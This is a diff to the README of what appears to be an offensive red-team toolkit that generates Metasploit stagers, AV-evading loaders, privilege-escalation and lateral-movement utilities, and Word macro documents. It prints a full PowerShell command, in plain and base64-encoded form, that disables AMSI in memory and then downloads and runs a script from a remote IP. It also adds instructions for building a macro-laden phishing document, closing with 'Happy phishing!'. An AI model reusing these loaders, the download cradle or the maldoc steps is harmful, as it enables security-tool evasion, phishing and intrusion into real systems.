@@ -4,11 +4,16 @@
 * By default, staged payloads will pull from the following URL `http://(LHOST)/sc`.
 * Stageless payloads will automatically apply an XOR encryption to obfuscate the shellcode.
 
+# Install Requirements
+```
+pip3 install -r requirements.txt
+```
+
 ## All Tools
 
 ```
-generate_msf_linux_exe.py
-generate_tool_loader.py
+generate_msf_linux_exe.py                   # Compile Linux MSF loader (XOR encoded to bypass AV)
+generate_tool_loader.py                     # Generate PowerShell loader strings for Windows utilities
 generate_win_hta.py
 generate_win_installutil_ps_runner.py
 generate_win_js.py
@@ -18,11 +23,11 @@ generate_win_msf_stager.py                  # Create stager for MSF shellcode
 generate_win_util_EfsPotato.py              # Compile EfsPotato Local PrivEsc Utility
 generate_win_util_MiniDump.py               # Compile MiniDump Tool
 generate_win_util_PowerupSQLScript.py       # Generate PowerupSQL automation script
-generate_win_util_PrintSpooferNet.py
-generate_win_util_PSLessExec.py
-generate_win_util_SQLAssembly.py
-generate_win_util_SQLClient.py
-generate_winword_macro.py
+generate_win_util_PrintSpooferNet.py        # Compile PrintSpooferNet utility for Windows local PrivEsc
+generate_win_util_PSLessExec.py             # Compile PSLessExec tool for Windows lateral movement
+generate_win_util_SQLAssembly.py            # Compile SQL Assembly for use with SQL Server Assembly RCE
+generate_win_util_SQLClient.py              # Compile SQLClient Utility
+generate_winword_macro.py                   # Generate Microsoft Word Maldoc
 generate_win_xsl.py
 
 ```
@@ -86,6 +91,27 @@ $ python3 generate_tool_loader.py --base64 powerupsql
 Command encoded: $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);IEX(New-Object Net.WebClient).downloadString('http://10.10.14.110/tools/PowerUpSQL.ps1');Invoke-SQLAudit
 powershell.exe -enc JABhAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQBzACgAKQA7AEYAbwByAGUAYQBjAGgAKAAkAGIAIABpAG4AIAAkAGEAKQAgAHsAaQBmACAAKAAkAGIALgBOAGEAbQBlACAALQBsAGkAawBlACAAIgAqAGkAVQB0AGkAbABzACIAKQAgAHsAJABjAD0AJABiAH0AfQA7ACQAZAA9ACQAYwAuAEcAZQB0AEYAaQBlAGwAZABzACgAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEYAbwByAGUAYQBjAGgAKAAkAGUAIABpAG4AIAAkAGQAKQAgAHsAaQBmACAAKAAkAGUALgBOAGEAbQBlACAALQBsAGkAawBlACAAIgAqAEMAbwBuAHQAZQB4AHQAIgApACAAewAkAGYAPQAkAGUAfQB9ADsAJABnAD0AJABmAC4ARwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACkAOwBbAEkAbgB0AFAAdAByAF0AJABwAHQAcgA9ACQAZwA7AFsASQBuAHQAMwAyAFsAXQBdACQAYgB1AGYAIAA9ACAAQAAoADAAKQA7AFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEMAbwBwAHkAKAAkAGIAdQBmACwAIAAwACwAIAAkAHAAdAByACwAIAAxACkAOwBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAxADAALwB0AG8AbwBsAHMALwBQAG8AdwBlAHIAVQBwAFMAUQBMAC4AcABzADEAJwApADsASQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQA
 ```
+
+## Microsoft Word Maldoc Generator
+Note: The Aspose-words library seems to have a bug where MS Word won't automatically execute Document_Open() or AutoOpen() on generated files.
+
+As a workaround to resolve this:
+  * Open the generated .doc file (*Leave Macros disabled when opening*)
+  * Modify the `ThisDocument` VBA code by adding (or removing) an empty line 
+  * Save document
+  * Happy phishing!
+
+### Maldoc Generation
+* Note: If a 32-bit Office version is running, set `IS_64BIT` to `False`
+
+```sh
+# Update document name to something better
+sed -i 's/DOC_NAME =.*/DOC_NAME = "Foobar.doc"/' generate_winword_macro.py
+
+# Generate document
+python3 generate_winword_macro.py
+```
+
 
 ## EFSPotato Local Priv Escalation
 The code is forked from https://github.com/zcgonvh/EfsPotato
